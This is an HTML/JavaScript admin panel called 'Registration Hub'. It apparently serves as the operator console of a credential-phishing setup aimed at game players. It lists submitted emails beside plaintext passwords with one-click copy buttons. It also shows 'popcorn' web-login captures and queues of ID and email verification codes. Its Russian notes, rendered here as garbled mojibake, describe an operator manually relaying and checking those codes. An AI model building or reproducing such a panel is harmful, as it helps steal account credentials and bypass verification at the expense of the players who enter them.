<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Registration Hub ‚Äî Admin Panel</title>

  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="description"
        content="Admin panel for viewing registration hub & popcorn records." />

  <style>
    :root {
      --bg-main: #020814;
      --bg-header: #020814;
      --bg-card: #0b101c;
      --bg-card-soft: #111827;
      --accent: #ffb800;
      --accent-alt: #ff8a00;
      --accent-soft: rgba(255, 184, 0, .16);
      --accent-green: #22c55e;
      --accent-red: #f97316;
      --text-main: #ffffff;
      --text-soft: #e5e7eb;
      --text-muted: #9ca3af;
      --radius-xl: 26px;
      --radius-lg: 20px;
      --radius-full: 999px;
      --shadow-soft: 0 18px 70px rgba(0, 0, 0, 0.78);
      --font-main: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      --transition-fast: .2s ease;
    }

    * { box-sizing: border-box; }

    body {
      margin: 0;
      padding: 0;
      font-family: var(--font-main);
      background: radial-gradient(circle at top, #141b33 0%, #020814 55%, #00040a 100%);
      color: var(--text-main);
      -webkit-font-smoothing: antialiased;
    }

    a {
      color: inherit;
      text-decoration: none;
    }

    .page {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    .inner {
      width: min(1320px, 100% - 40px);
      margin: 0 auto;
    }

    /* HEADER */

    .header-wrap {
      position: sticky;
      top: 0;
      z-index: 50;
      backdrop-filter: blur(18px);
      background: radial-gradient(circle at top,
              rgba(0,0,0,0.88),
              rgba(2, 8, 20, 0.98));
      border-bottom: 1px solid rgba(255, 255, 255, 0.06);
    }

    .header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 24px;
      padding: 10px 0 8px;
    }

    .logo-combo {
      display: inline-flex;
      align-items: center;
      gap: 10px;
    }

    .logo-mark {
      width: 34px;
      height: 34px;
      border-radius: 12px;
      background:
        radial-gradient(circle at 30% 0, rgba(255, 184, 0, 0.35), transparent),
        #040810;
      box-shadow:
        0 0 0 1px rgba(255, 184, 0, 0.22),
        0 0 18px rgba(255, 184, 0, 0.45);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 14px;
      font-weight: 900;
      letter-spacing: 0.18em;
    }

    .logo-text-block {
      display: flex;
      flex-direction: column;
      line-height: 1.05;
    }

    .logo-text-block .top-line {
      display: flex;
      gap: 4px;
      font-weight: 800;
      font-size: 14px;
      letter-spacing: 0.08em;
      color: var(--accent);
    }

    .logo-text-block .sub-line {
      font-size: 8px;
      letter-spacing: 0.16em;
      text-transform: uppercase;
      color: #9ca3af;
    }

    .admin-badge {
      padding: 4px 10px;
      border-radius: var(--radius-full);
      border: 1px solid rgba(248,250,252,0.2);
      font-size: 9px;
      text-transform: uppercase;
      letter-spacing: 0.16em;
      color: var(--accent-red);
      background: rgba(15,23,42,0.92);
    }

    /* MAIN */

    main {
      padding: 18px 0 22px;
      flex: 1;
    }

    .section-title {
      font-size: 12px;
      text-transform: uppercase;
      letter-spacing: 0.18em;
      margin-bottom: 7px;
    }

    .section-title .bar {
      display: inline-block;
      width: 28px;
      height: 2px;
      background: var(--accent);
      margin-right: 7px;
      border-radius: 999px;
      vertical-align: middle;
    }

    .section-sub {
      font-size: 8.5px;
      color: var(--text-muted);
      max-width: 720px;
      margin-bottom: 14px;
    }

    .card {
      padding: 14px 14px 12px;
      border-radius: var(--radius-xl);
      background: var(--bg-card);
      border: 1px solid rgba(255,255,255,0.06);
      box-shadow: var(--shadow-soft);
    }

    .card-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      gap: 10px;
      margin-bottom: 8px;
    }

    .card-title {
      font-size: 10px;
      text-transform: uppercase;
      letter-spacing: 0.16em;
      color: var(--text-soft);
    }

    .card-sub {
      font-size: 8px;
      color: var(--text-muted);
      margin-bottom: 8px;
    }

    .pill {
      font-size: 8px;
      padding: 4px 8px;
      border-radius: 999px;
      border: 1px solid rgba(148,163,253,0.4);
      color: var(--text-muted);
      text-transform: uppercase;
      letter-spacing: 0.14em;
    }

    .btn-xs {
      padding: 4px 9px;
      border-radius: 999px;
      border: 1px solid rgba(148,163,253,0.4);
      background: rgba(15,23,42,0.96);
      font-size: 8px;
      text-transform: uppercase;
      letter-spacing: 0.14em;
      color: var(--text-soft);
      cursor: pointer;
      display: inline-flex;
      align-items: center;
      gap: 4px;
      transition: all var(--transition-fast);
    }

    .btn-xs:hover {
      border-color: var(--accent);
      color: var(--accent);
      box-shadow: 0 0 14px rgba(0,0,0,1);
    }

    .btn-xs--danger {
      border-color: rgba(239,68,68,0.9);
      color: #fecaca;
    }

    .btn-xs--primary {
      border-color: rgba(34,197,94,0.9);
      color: #bbf7d0;
    }

    .btn-xs:disabled {
      opacity: 0.4;
      cursor: default;
      box-shadow: none;
    }

    .global-status {
      font-size: 8px;
      margin-top: 4px;
      color: var(--text-muted);
    }

    .global-status.ok {
      color: var(--accent-green);
    }

    .global-status.err {
      color: var(--accent-red);
    }

    .logs-wrapper {
      margin-top: 14px;
      overflow-x: auto;
    }

    .logs-table {
      width: 100%;
      border-collapse: collapse;
      border-spacing: 0;
      margin-top: 4px;
      font-size: 9px;
    }

    .logs-table thead {
      background: rgba(15,23,42,0.9);
    }

    .logs-table th,
    .logs-table td {
      padding: 6px 8px;
      border-bottom: 1px solid rgba(31,41,55,0.9);
      text-align: left;
      vertical-align: top;
    }

    .logs-table th {
      font-weight: 600;
      color: var(--text-soft);
      text-transform: uppercase;
      letter-spacing: 0.12em;
      font-size: 8px;
      white-space: nowrap;
    }

    .logs-table tbody tr:nth-child(even) {
      background: rgba(15,23,42,0.78);
    }

    .logs-table tbody tr:nth-child(odd) {
      background: rgba(15,23,42,0.96);
    }

    .logs-table td.actions-cell {
      white-space: nowrap;
    }

    .mono {
      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
      font-size: 9px;
    }

    .chip {
      display: inline-flex;
      align-items: center;
      padding: 2px 6px;
      border-radius: 999px;
      border: 1px solid rgba(55,65,81,0.9);
      background: rgba(15,23,42,0.7);
      font-size: 8px;
      color: var(--text-muted);
      margin-right: 4px;
      margin-bottom: 2px;
    }

    .chip-label {
      text-transform: uppercase;
      letter-spacing: .12em;
      font-size: 7px;
      margin-right: 4px;
      color: #6b7280;
    }

    .chip--hub {
      border-color: rgba(59,130,246,0.8);
      color: #bfdbfe;
    }

    .chip--popcorn {
      border-color: rgba(249,115,22,0.9);
      color: #fed7aa;
    }

    .chip--status-approved {
      border-color: rgba(22,163,74,0.9);
      color: #bbf7d0;
    }

    .chip--status-declined {
      border-color: rgba(239,68,68,0.9);
      color: #fecaca;
    }

    .chip--status-pending {
      border-color: rgba(148,163,253,0.7);
      color: #c7d2fe;
    }

    /* GRID –¥–ª—è —Å–µ–∫—Ü–∏–∏ –∫–æ–¥–æ–≤ */

    .admin-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 12px;
      margin-top: 10px;
    }

    @media (max-width: 1024px) {
      .admin-grid {
        grid-template-columns: 1fr;
      }
    }

    .list-empty {
      font-size: 8px;
      color: var(--text-muted);
      padding: 4px 0 2px;
    }

    .item {
      border-radius: 16px;
      border: 1px solid rgba(31,41,55,0.9);
      padding: 8px 9px 7px;
      margin-bottom: 7px;
      background: radial-gradient(circle at top, rgba(15,23,42,0.9), rgba(15,23,42,0.98));
    }

    .item-header {
      display: flex;
      justify-content: space-between;
      gap: 8px;
      margin-bottom: 4px;
    }

    .item-main {
      font-size: 9px;
      font-weight: 600;
      color: var(--text-soft);
    }

    .item-meta {
      font-size: 8px;
      color: var(--text-muted);
      display: flex;
      flex-wrap: wrap;
      gap: 6px;
    }

    .meta-tag {
      padding: 2px 6px;
      border-radius: 999px;
      border: 1px solid rgba(55,65,81,0.8);
      background: rgba(17,24,39,0.9);
      font-size: 8px;
    }

    .status-tag {
      padding: 2px 6px;
      border-radius: 999px;
      font-size: 8px;
      text-transform: uppercase;
      letter-spacing: 0.14em;
    }

    .status-tag--pending {
      border: 1px solid rgba(249,115,22,0.8);
      color: #fed7aa;
      background: rgba(249,115,22,0.08);
    }

    .status-tag--sent {
      border: 1px solid rgba(56,189,248,0.8);
      color: #e0f2fe;
      background: rgba(56,189,248,0.08);
    }

    .status-tag--valid {
      border: 1px solid rgba(34,197,94,0.9);
      color: #bbf7d0;
      background: rgba(34,197,94,0.14);
    }

    .status-tag--invalid {
      border: 1px solid rgba(239,68,68,0.9);
      color: #fecaca;
      background: rgba(239,68,68,0.12);
    }

    .item-row {
      font-size: 8px;
      color: var(--text-muted);
      margin-bottom: 2px;
    }

    .item-row--code {
      margin-top: 4px;
      margin-bottom: 2px;
      padding: 4px 7px;
      border-radius: 999px;
      background: rgba(15,23,42,0.95);
      border: 1px dashed rgba(148,163,253,0.6);
      display: inline-flex;
      align-items: center;
      gap: 6px;
    }

    .code-label {
      font-size: 7px;
      text-transform: uppercase;
      letter-spacing: 0.16em;
      color: var(--text-muted);
    }

    .code-pill {
      padding: 2px 8px;
      border-radius: 999px;
      border: 1px solid var(--accent);
      background: var(--accent-soft);
      font-size: 9px;
      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
      letter-spacing: 0.16em;
      text-transform: uppercase;
      color: var(--accent);
      white-space: nowrap;
    }

    .code-pill--email {
      border-color: rgba(56,189,248,0.9);
      background: rgba(56,189,248,0.12);
      color: #e0f2fe;
    }

    .code-pill--access {
      border-style: dashed;
      opacity: 0.9;
    }

    .item-actions {
      display: flex;
      flex-wrap: wrap;
      gap: 6px;
      margin-top: 6px;
    }

    .footer {
      margin-top: 18px;
      padding: 12px 0 18px;
      font-size: 8px;
      color: var(--text-muted);
      text-align: center;
      border-top: 1px solid rgba(255, 255, 255, 0.06);
      background: radial-gradient(circle at top,
              rgba(255,184,0,0.03),
              transparent);
    }

    @media (max-width: 900px) {
      .logs-table {
        font-size: 8px;
      }
    }

  </style>
</head>
<body>
<div class="page">

  <!-- HEADER -->
  <div class="header-wrap">
    <div class="inner header">
      <div class="logo-combo">
        <div class="logo-mark">RH</div>
        <div class="logo-text-block">
          <div class="top-line">
            <span>REG</span>
            <span>HUB</span>
          </div>
          <div class="sub-line">ADMIN PANEL ‚Ä¢ HUB + POPCORN</div>
        </div>
      </div>

      <div class="admin-badge">
        INTERNAL PANEL ‚Ä¢ PRIVATE ACCESS
      </div>
    </div>
  </div>

  <!-- MAIN -->
  <main>
    <div class="inner">

      <!-- REGISTRATIONS TABLE -->
      <section>
        <div class="section-title">
          <span class="bar"></span>Registrations & Popcorn
        </div>
        <div class="section-sub">
          –ó–¥–µ—Å—å –æ—Ç–æ–±—Ä–∞–∂–∞—é—Ç—Å—è –≤—Å–µ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ –∏–∑ —Ö–∞–±–∞ (flow <strong>hub</strong>)
          –∏ ‚Äú–ø–æ–ø–∫–æ—Ä–Ω‚Äù-–ª–æ–≥–∏–Ω—ã (flow <strong>popcorn</strong>).
          –ü–æ–ø–∫–æ—Ä–Ω –º–æ–∂–Ω–æ —Ä–∞—Å–ø–æ–∑–Ω–∞—Ç—å –ø–æ <strong>flow = POPCORN</strong> –∏/–∏–ª–∏
          <code>ingameId = web-login</code>.  
          –ß–µ—Ä–µ–∑ –¥–µ–π—Å—Ç–≤–∏—è —Å–ø—Ä–∞–≤–∞ –º–æ–∂–Ω–æ <strong>approve / decline / delete</strong> –∑–∞—è–≤–∫—É
          –∏ –∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å email / password.
        </div>

        <div class="card">
          <div class="card-header">
            <div class="card-title">Stored registrations</div>
            <div style="display:flex;align-items:center;gap:8px;">
              <span class="pill" id="logs-count-pill">0 items</span>
              <button class="btn-xs" id="reload-btn">
                ‚ü≥ Reload
              </button>
            </div>
          </div>

          <div id="global-status" class="global-status"></div>

          <div class="logs-wrapper">
            <table class="logs-table">
              <thead>
              <tr>
                <th>#</th>
                <th>Flow</th>
                <th>Email</th>
                <th>Password</th>
                <th>In-game ID</th>
                <th>Access code</th>
                <th>Verify</th>
                <th>Status</th>
                <th>Created</th>
                <th></th>
              </tr>
              </thead>
              <tbody id="logs-tbody">
              <!-- rows inject here -->
              </tbody>
            </table>
          </div>
        </div>
      </section>

      <!-- CODES SECTION -->
      <section style="margin-top:20px;">
        <div class="section-title">
          <span class="bar"></span>Verification codes (ID / Email)
        </div>
        <div class="section-sub">
          –ó–¥–µ—Å—å –æ—Ç–æ–±—Ä–∞–∂–∞—é—Ç—Å—è –≤—Å–µ –∑–∞–ø—Ä–æ—Å—ã –Ω–∞ –∫–æ–¥—ã, –∫–æ—Ç–æ—Ä—ã–µ —Å–æ–∑–¥–∞—ë—Ç —Ñ–æ—Ä–º–∞:<br>
          <strong>ID verification code</strong> –∏ <strong>Email verification code</strong>.  
          –ê–¥–º–∏–Ω –≤—Ä—É—á–Ω—É—é —Å–≤–µ—Ä—è–µ—Ç –∫–æ–¥—ã, –∫–æ—Ç–æ—Ä—ã–µ –∏–≥—Ä–æ–∫ –≤–≤—ë–ª, —Å —Ç–µ–º–∏, —á—Ç–æ –æ–Ω –µ–º—É –≤—ã–¥–∞–ª,
          –∏ —Ç—É—Ç –æ—Ç–º–µ—á–∞–µ—Ç <strong>VALID / INVALID</strong> –∏–ª–∏ —É–¥–∞–ª—è–µ—Ç –∑–∞–ø—Ä–æ—Å.
        </div>

        <div class="admin-grid">
          <!-- ID CODES -->
          <div class="card">
            <div class="card-header">
              <div class="card-title">ID verification codes</div>
              <div class="pill" id="id-count-pill">0 items</div>
            </div>
            <div class="card-sub">
              –°–æ–∑–¥–∞—é—Ç—Å—è, –∫–æ–≥–¥–∞ –∏–≥—Ä–æ–∫ –Ω–∞–∂–∏–º–∞–µ—Ç <strong>SEND REQUEST</strong> –ø–æ–¥ ID-–∫–æ–¥–æ–º.
              –¢—ã –æ—Ç–ø—Ä–∞–≤–ª—è–µ—à—å –µ–º—É –∫–æ–¥ (–ª—é–±–æ–π –∫–∞–Ω–∞–ª), –æ–Ω –≤–≤–æ–¥–∏—Ç –µ–≥–æ –Ω–∞ —Å–∞–π—Ç–µ,
              –∞ –ø–æ—Ç–æ–º —Ç—ã –∑–¥–µ—Å—å –æ—Ç–º–µ—á–∞–µ—à—å, –≤–µ—Ä–Ω—ã–π –æ–Ω –∏–ª–∏ –Ω–µ—Ç.
            </div>
            <div id="id-requests-list"></div>
          </div>

          <!-- EMAIL CODES -->
          <div class="card">
            <div class="card-header">
              <div class="card-title">Email verification codes</div>
              <div class="pill" id="email-count-pill">0 items</div>
            </div>
            <div class="card-sub">
              –ê–Ω–∞–ª–æ–≥–∏—á–Ω–æ, –Ω–æ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ email.  
              –ü–æ—Å–ª–µ —Ç–æ–≥–æ –∫–∞–∫ –∏–≥—Ä–æ–∫ –≤–≤—ë–ª –∫–æ–¥, —Ç—ã –ø–æ–º–µ—á–∞–µ—à—å –µ–≥–æ –∫–∞–∫ VALID / INVALID,
              –∏ —Ä–µ–∑—É–ª—å—Ç–∞—Ç —É—Ö–æ–¥–∏—Ç –æ–±—Ä–∞—Ç–Ω–æ –Ω–∞ —Å–∞–π—Ç –≤ CHECK.
            </div>
            <div id="email-requests-list"></div>
          </div>
        </div>
      </section>

    </div>
  </main>

  <!-- FOOTER -->
  <footer class="footer">
    REGISTRATION HUB PANEL ‚Äî internal view for hub & popcorn data and verification codes. Keep this page private.
  </footer>
</div>

<script>
  // ========= CONFIG: —Å–æ–≤–º–µ—Å—Ç–∏–º–æ —Å–æ —Å—Ç–∞—Ä—ã–º backend =========
  const API_BASE    = "/admin/api";
  const STATE_URL   = API_BASE + "/state";                 // GET -> { idCodeRequests, emailCodeRequests, registrations }
  const APPROVE_URL = API_BASE + "/registration/approve";  // POST -> { id, slot, link, note }
  const DECLINE_URL = API_BASE + "/registration/decline";  // POST -> { id, reason, note }
  const DELETE_URL  = API_BASE + "/registration/delete";   // POST -> { id }

  const ID_VALID_URL    = API_BASE + "/id-code/mark-valid";
  const ID_INVALID_URL  = API_BASE + "/id-code/mark-invalid";
  const ID_DELETE_URL   = API_BASE + "/id-code/delete";

  const EMAIL_VALID_URL   = API_BASE + "/email-code/mark-valid";
  const EMAIL_INVALID_URL = API_BASE + "/email-code/mark-invalid";
  const EMAIL_DELETE_URL  = API_BASE + "/email-code/delete";

  const tbodyEl    = document.getElementById("logs-tbody");
  const countPill  = document.getElementById("logs-count-pill");
  const globalStatusEl = document.getElementById("global-status");
  const reloadBtn  = document.getElementById("reload-btn");

  // –∫–æ–¥–æ–≤—ã–µ —Å–ø–∏—Å–∫–∏
  const idListEl       = document.getElementById("id-requests-list");
  const emailListEl    = document.getElementById("email-requests-list");
  const idCountPill    = document.getElementById("id-count-pill");
  const emailCountPill = document.getElementById("email-count-pill");

  function setStatus(text, type) {
    globalStatusEl.textContent = text || "";
    globalStatusEl.className   = "global-status" + (type ? " " + type : "");
  }

  function formatDate(iso) {
    if (!iso) return "";
    const d = new Date(iso);
    if (isNaN(d.getTime())) return iso;
    const date = d.toLocaleDateString("en-GB", {
      day: "2-digit", month: "2-digit", year: "numeric"
    });
    const time = d.toLocaleTimeString("en-GB", {
      hour: "2-digit", minute: "2-digit"
    });
    return date + " " + time;
  }

  async function getJSON(url) {
    const res = await fetch(url, { credentials: "same-origin" });
    if (!res.ok) throw new Error("HTTP " + res.status);
    return res.json();
  }

  async function postJSON(url, payload) {
    const res = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      credentials: "same-origin",
      body: JSON.stringify(payload || {})
    });
    if (!res.ok) throw new Error("HTTP " + res.status);
    try { return await res.json(); } catch { return {}; }
  }

  /* ---------- REGISTRATIONS TABLE ---------- */

  function renderRows(items) {
    if (!items || items.length === 0) {
      tbodyEl.innerHTML = `
        <tr>
          <td colspan="10" style="text-align:center;color:var(--text-muted);padding:10px 0;">
            No registrations yet.
          </td>
        </tr>`;
      countPill.textContent = "0 items";
      return;
    }

    // –Ω–æ–≤—ã–µ —Å–≤–µ—Ä—Ö—É
    items.sort((a, b) => {
      const da = new Date(a.createdAt || 0).getTime();
      const db = new Date(b.createdAt || 0).getTime();
      return db - da;
    });

    countPill.textContent = items.length + (items.length === 1 ? " item" : " items");

    const rows = items.map((item, idx) => {
      const id        = item.id ?? item.pk ?? idx;
      const flowRaw   = (item.flow || "hub").toLowerCase();
      const email     = item.email || "";
      const password  = item.password || item.pass || "";
      const ingameId  = item.ingameId || "";
      const accessCode= item.accessCode || "";
      const created   = formatDate(item.createdAt || item.created_at || item.timestamp);

      const idVerified    = item.idVerified    ? "‚úî" : "‚Äî";
      const emailVerified = item.emailVerified ? "‚úî" : "‚Äî";
      const statusRaw     = (item.status || "pending").toLowerCase();

      let flowChipClass = "chip";
      let flowLabel     = "HUB";
      if (flowRaw === "popcorn") {
        flowChipClass += " chip--popcorn";
        flowLabel = "POPCORN";
      } else {
        flowChipClass += " chip--hub";
      }

      let statusChipClass = "chip";
      if (statusRaw === "approved") statusChipClass += " chip--status-approved";
      else if (statusRaw === "declined") statusChipClass += " chip--status-declined";
      else statusChipClass += " chip--status-pending";

      const isFinal = statusRaw === "approved" || statusRaw === "declined";

      return `
        <tr data-id="${id}">
          <td>${idx + 1}</td>
          <td>
            <span class="${flowChipClass}">
              <span class="chip-label">FLOW</span>${flowLabel}
            </span>
          </td>
          <td class="mono">${email || "‚Äî"}</td>
          <td class="mono">${password || "‚Äî"}</td>
          <td class="mono">${ingameId || "‚Äî"}</td>
          <td class="mono">${accessCode || "‚Äî"}</td>
          <td>
            <span class="chip">
              <span class="chip-label">ID</span>${idVerified}
            </span>
            <span class="chip">
              <span class="chip-label">MAIL</span>${emailVerified}
            </span>
          </td>
          <td>
            <span class="${statusChipClass}">
              <span class="chip-label">STATUS</span>${statusRaw.toUpperCase()}
            </span>
          </td>
          <td>${created || "‚Äî"}</td>
          <td class="actions-cell">
            <button class="btn-xs btn-xs--primary"
                    data-action="copy"
                    data-field="email"
                    data-id="${id}">
              üìã Email
            </button>
            <button class="btn-xs btn-xs--primary"
                    data-action="copy"
                    data-field="password"
                    data-id="${id}">
              üìã Pass
            </button>
            <button class="btn-xs btn-xs--primary"
                    data-action="approve"
                    data-id="${id}"
                    ${isFinal ? "disabled" : ""}>
              ‚úÖ Approve
            </button>
            <button class="btn-xs btn-xs--danger"
                    data-action="decline"
                    data-id="${id}"
                    ${isFinal ? "disabled" : ""}>
              ‚ùå Decline
            </button>
            <button class="btn-xs btn-xs--danger"
                    data-action="delete"
                    data-id="${id}">
              üóë Delete
            </button>
          </td>
        </tr>
      `;
    }).join("");

    tbodyEl.innerHTML = rows;
  }

  function findRowData(id) {
    const row = tbodyEl.querySelector('tr[data-id="' + id + '"]');
    if (!row) return {};
    const cells = row.children;
    return {
      email:    cells[2]?.textContent.trim() || "",
      password: cells[3]?.textContent.trim() || ""
    };
  }

  async function copyField(id, field) {
    const data  = findRowData(id);
    const value = data[field] || "";
    if (!value) return;
    try {
      await navigator.clipboard.writeText(value);
      setStatus(field + " copied to clipboard.", "ok");
    } catch (e) {
      console.error(e);
      setStatus("Failed to copy to clipboard.", "err");
    }
  }

  async function approveRegistration(id) {
    const slot = prompt("Slot (optional, e.g. GROUP A / LOBBY 3):", "");
    if (slot === null) return;
    const link = prompt("Link (optional, lobby / room link):", "");
    if (link === null) return;
    const note = prompt("Internal note (optional):", "");
    if (note === null) return;

    setStatus("Approving #" + id + "‚Ä¶", "");
    try {
      await postJSON(APPROVE_URL, { id, slot, link, note });
      setStatus("Registration approved.", "ok");
      await loadState();
    } catch (e) {
      console.error(e);
      setStatus("Failed to approve. Check backend.", "err");
    }
  }

  async function declineRegistration(id) {
    const reason = prompt("Decline reason (short: invalid_email / risky_account / other):", "other");
    if (reason === null) return;
    const note = prompt("Internal note (optional):", "");
    if (note === null) return;

    setStatus("Declining #" + id + "‚Ä¶", "");
    try {
      await postJSON(DECLINE_URL, { id, reason, note });
      setStatus("Registration declined.", "ok");
      await loadState();
    } catch (e) {
      console.error(e);
      setStatus("Failed to decline. Check backend.", "err");
    }
  }

  async function deleteRegistration(id) {
    if (!confirm("Delete this registration? This cannot be undone.")) return;
    setStatus("Deleting #" + id + "‚Ä¶", "");
    try {
      await postJSON(DELETE_URL, { id });
      setStatus("Registration deleted.", "ok");
      await loadState();
    } catch (e) {
      console.error(e);
      setStatus("Failed to delete. Check backend.", "err");
    }
  }

  // –¥–µ–ª–µ–≥–∏—Ä—É–µ–º –∫–ª–∏–∫–∏ –ø–æ —Ç–∞–±–ª–∏—Ü–µ
  tbodyEl.addEventListener("click", (e) => {
    const btn = e.target.closest("button[data-action]");
    if (!btn) return;
    const action = btn.getAttribute("data-action");
    const id     = btn.getAttribute("data-id");
    if (!action || !id) return;

    if (action === "copy") {
      const field = btn.getAttribute("data-field");
      copyField(id, field);
    } else if (action === "approve") {
      approveRegistration(id);
    } else if (action === "decline") {
      declineRegistration(id);
    } else if (action === "delete") {
      deleteRegistration(id);
    }
  });

  /* ---------- CODE REQUESTS (ID / EMAIL) ---------- */

  function statusBadgeForRequest(status) {
    const s = (status || "pending").toLowerCase();
    if (s === "valid")   return '<span class="status-tag status-tag--valid">VALID</span>';
    if (s === "invalid") return '<span class="status-tag status-tag--invalid">INVALID</span>';
    if (s === "sent" || s === "code_sent") return '<span class="status-tag status-tag--sent">CODE SENT</span>';
    return '<span class="status-tag status-tag--pending">PENDING</span>';
  }

  function renderIdRequests(list) {
    if (!list || list.length === 0) {
      idListEl.innerHTML = '<div class="list-empty">No ID verification requests yet.</div>';
      idCountPill.textContent = "0 items";
      return;
    }

    idCountPill.textContent = list.length + (list.length === 1 ? " item" : " items");

    const html = list.map(item => {
      const created = formatDate(item.createdAt);
      const status = statusBadgeForRequest(item.status);

      const accessTag = item.accessCode
        ? `<span class="meta-tag">Access: <span class="code-pill code-pill--access">${item.accessCode}</span></span>`
        : `<span class="meta-tag">Access: ‚Äî</span>`;

      const lastCodeLine = item.lastCode
        ? `<div class="item-row item-row--code">
             <span class="code-label">ID CODE</span>
             <span class="code-pill">${item.lastCode}</span>
           </div>`
        : "";

      const lastCodeTimeLine = item.lastCodeAt
        ? `<div class="item-row"><strong>Last check:</strong> ${formatDate(item.lastCodeAt)}</div>`
        : "";

      return `
        <div class="item" data-id="${item.id}">
          <div class="item-header">
            <div class="item-main">
              ${item.ingameId || "Unknown ID"}
            </div>
            ${status}
          </div>
          <div class="item-meta">
            ${accessTag}
            <span class="meta-tag">Email: ${item.email || "‚Äî"}</span>
            ${created ? `<span class="meta-tag">${created}</span>` : ""}
          </div>
          ${lastCodeLine}
          ${lastCodeTimeLine}
          <div class="item-actions">
            <button class="btn-xs btn-xs--primary"
                    data-action="mark-id-valid"
                    data-id="${item.id}">
              ‚úî ID OK
            </button>
            <button class="btn-xs btn-xs--danger"
                    data-action="mark-id-invalid"
                    data-id="${item.id}">
              ‚úï ID BAD
            </button>
            <button class="btn-xs btn-xs--danger"
                    data-action="delete-id-request"
                    data-id="${item.id}">
              üóë DELETE
            </button>
          </div>
        </div>
      `;
    }).join("");

    idListEl.innerHTML = html;
  }

  function renderEmailRequests(list) {
    if (!list || list.length === 0) {
      emailListEl.innerHTML = '<div class="list-empty">No email verification requests yet.</div>';
      emailCountPill.textContent = "0 items";
      return;
    }

    emailCountPill.textContent = list.length + (list.length === 1 ? " item" : " items");

    const html = list.map(item => {
      const created = formatDate(item.createdAt);
      const status = statusBadgeForRequest(item.status);

      const accessTag = item.accessCode
        ? `<span class="meta-tag">Access: <span class="code-pill code-pill--access">${item.accessCode}</span></span>`
        : `<span class="meta-tag">Access: ‚Äî</span>`;

      const lastCodeLine = item.lastCode
        ? `<div class="item-row item-row--code">
             <span class="code-label">EMAIL CODE</span>
             <span class="code-pill code-pill--email">${item.lastCode}</span>
           </div>`
        : "";

      const lastCodeTimeLine = item.lastCodeAt
        ? `<div class="item-row"><strong>Last check:</strong> ${formatDate(item.lastCodeAt)}</div>`
        : "";

      return `
        <div class="item" data-id="${item.id}">
          <div class="item-header">
            <div class="item-main">
              ${item.email || "Unknown email"}
            </div>
            ${status}
          </div>
          <div class="item-meta">
            ${accessTag}
            ${item.ingameId ? `<span class="meta-tag">ID: ${item.ingameId}</span>` : ""}
            ${created ? `<span class="meta-tag">${created}</span>` : ""}
          </div>
          ${lastCodeLine}
          ${lastCodeTimeLine}
          <div class="item-actions">
            <button class="btn-xs btn-xs--primary"
                    data-action="mark-email-valid"
                    data-id="${item.id}">
              ‚úî EMAIL OK
            </button>
            <button class="btn-xs btn-xs--danger"
                    data-action="mark-email-invalid"
                    data-id="${item.id}">
              ‚úï EMAIL BAD
            </button>
            <button class="btn-xs btn-xs--danger"
                    data-action="delete-email-request"
                    data-id="${item.id}">
              üóë DELETE
            </button>
          </div>
        </div>
      `;
    }).join("");

    emailListEl.innerHTML = html;
  }

  async function handleCodeAction(action, id) {
    try {
      let url = "";
      let payload = { id };

      if (action === "mark-id-valid") {
        url = ID_VALID_URL;
      } else if (action === "mark-id-invalid") {
        url = ID_INVALID_URL;
      } else if (action === "delete-id-request") {
        if (!confirm("Delete this ID verification request? This cannot be undone.")) return;
        url = ID_DELETE_URL;
      } else if (action === "mark-email-valid") {
        url = EMAIL_VALID_URL;
      } else if (action === "mark-email-invalid") {
        url = EMAIL_INVALID_URL;
      } else if (action === "delete-email-request") {
        if (!confirm("Delete this email verification request? This cannot be undone.")) return;
        url = EMAIL_DELETE_URL;
      }

      if (!url) return;

      setStatus("Performing action: " + action + "‚Ä¶", "");
      await postJSON(url, payload);
      setStatus("Action completed: " + action + ".", "ok");
      await loadState();
    } catch (e) {
      console.error(e);
      setStatus("Action failed: " + action + ". Check backend logs.", "err");
    }
  }

  // –¥–µ–ª–µ–≥–∏—Ä—É–µ–º –∫–ª–∏–∫–∏ –ø–æ –¥–≤—É–º —Å–ø–∏—Å–∫–∞–º –∫–æ–¥–æ–≤
  [idListEl, emailListEl].forEach(container => {
    container.addEventListener("click", (e) => {
      const btn = e.target.closest("button[data-action]");
      if (!btn) return;
      const action = btn.getAttribute("data-action");
      const id     = btn.getAttribute("data-id");
      if (!action || !id) return;
      handleCodeAction(action, id);
    });
  });

  /* ---------- LOAD STATE ---------- */

  async function loadState() {
    setStatus("Loading admin state‚Ä¶", "");
    try {
      const data = await getJSON(STATE_URL);

      const regs   = Array.isArray(data.registrations)   ? data.registrations   : [];
      const idReqs = Array.isArray(data.idCodeRequests)  ? data.idCodeRequests  : [];
      const emReqs = Array.isArray(data.emailCodeRequests) ? data.emailCodeRequests : [];

      renderRows(regs);
      renderIdRequests(idReqs);
      renderEmailRequests(emReqs);

      setStatus("State loaded. Use buttons to manage requests.", "ok");
    } catch (e) {
      console.error(e);
      setStatus("Failed to load admin state. Check backend /admin/api/state.", "err");

      tbodyEl.innerHTML = `
        <tr>
          <td colspan="10" style="text-align:center;color:var(--text-muted);padding:10px 0;">
            Error loading registrations.
          </td>
        </tr>`;
      countPill.textContent = "0 items";

      idListEl.innerHTML    = '<div class="list-empty">Error loading ID requests.</div>';
      emailListEl.innerHTML = '<div class="list-empty">Error loading email requests.</div>';
      idCountPill.textContent    = "0 items";
      emailCountPill.textContent = "0 items";
    }
  }

  reloadBtn.addEventListener("click", () => {
    loadState();
  });

  // —Å—Ç–∞—Ä—Ç
  loadState();
</script>

</body>
</html>
